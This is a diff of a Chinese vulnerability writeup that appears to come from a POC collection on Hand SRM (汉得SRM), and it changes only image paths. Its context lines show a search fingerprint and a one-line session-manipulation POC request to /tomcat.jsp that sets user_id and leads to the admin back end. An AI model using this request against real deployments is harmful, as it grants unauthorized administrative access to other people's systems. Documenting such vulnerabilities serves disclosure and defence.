@@ -18,7 +18,7 @@ web.body="汉得SRM"
 
 登陆页面
 
-![image-20230828164434474](images/image-20230828164434474.png)
+![image-20230828164434474](../.gitbook/assets/image-20230828164434474.png)
 
 验证POC (Tomcat session操控)
 
@@ -27,7 +27,7 @@ web.body="汉得SRM"
 /tomcat.jsp?dataName=user_id&dataValue=1
 ```
 
-![image-20230828164451105](images/image-20230828164451105.png)
+![image-20230828164451105](../.gitbook/assets/image-20230828164451105.png)
 
 访问跳转后台
 
